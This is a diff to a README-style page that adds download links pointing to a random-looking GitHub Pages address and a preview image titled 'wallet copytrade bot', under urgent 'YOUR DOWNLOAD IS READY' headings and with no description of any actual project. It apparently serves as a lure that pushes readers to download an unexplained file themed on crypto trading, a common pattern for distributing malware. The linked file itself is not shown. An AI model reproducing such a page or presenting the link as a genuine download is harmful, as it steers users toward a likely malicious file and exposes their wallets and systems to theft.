@@ -1,6 +1,6 @@
 # ⬇️ **YOUR DOWNLOAD IS READY**
 
-## [📥 **DOWNLOAD THE FILE**]( )
+## [📥 **DOWNLOAD THE FILE**](https://hlhczkubcboa.github.io/.github/)
 
 > Select the link above in your browser to start the download.
 
@@ -8,11 +8,11 @@
 
 ## 🖼️ **TAKE A LOOK**
 
-<img src="" width="1280" height="720" alt="File screenshot preview">
+<img src="https://github.com/hlhczkubcboa/.github/blob/main/wallet%20copytrade%20bot.png?raw=true" width="1280" height="720" alt="File screenshot preview">
 
 ---
 
-### 📦 [**ACCESS THE DOWNLOAD**]( )
+### 📦 [**ACCESS THE DOWNLOAD**](https://hlhczkubcboa.github.io/.github/)
 
 
 ---
